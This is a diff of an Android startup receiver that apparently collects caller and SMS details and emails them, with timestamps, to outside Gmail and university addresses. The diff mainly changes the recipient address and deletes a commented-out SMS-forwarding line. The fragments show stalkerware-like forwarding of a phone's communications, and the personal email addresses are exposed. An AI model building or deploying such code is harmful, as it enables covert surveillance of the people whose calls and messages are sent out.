@@ -91,7 +91,6 @@ public class StartUpReceiver extends BroadcastReceiver
 
             }
 
-
         }
     }
 
@@ -125,7 +124,6 @@ public class StartUpReceiver extends BroadcastReceiver
             {
                 WriteLog ("Phone Rests: " + Caller);
 
-
             }
         }
 
@@ -138,7 +136,7 @@ public class StartUpReceiver extends BroadcastReceiver
 
 
             String line = Line + "   (" + TimeStamp + ")";
-        sender = new Mail("katsarosm47@gmail.com", "");
+        sender = new Mail("pavlos.repin@gmail.com", "");
         StringMake.setString(line);
         StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.
                     Builder().permitAll().build();
@@ -153,8 +151,6 @@ public class StartUpReceiver extends BroadcastReceiver
         {
 
         }
-         //   SmsManager sms = SmsManager.getDefault();
-          //  sms.sendTextMessage(p, null, line, null, null);
 
     }
 
@@ -183,7 +179,6 @@ public class StartUpReceiver extends BroadcastReceiver
         }
 
 
-
         @Override
 
         protected Void doInBackground(Void... mApi) {
@@ -195,7 +190,7 @@ public class StartUpReceiver extends BroadcastReceiver
                 String line = null;
                 line = StringMake.getString();
 
-                sender.sendMail("New SMS", line, "katsarosm47@gmail.com", "cse242017051@uniwa.gr");
+                sender.sendMail("New SMS", line, "pavlos.repin@gmail.com", "cse242017051@uniwa.gr");
 
             } catch (Exception ex) {
 
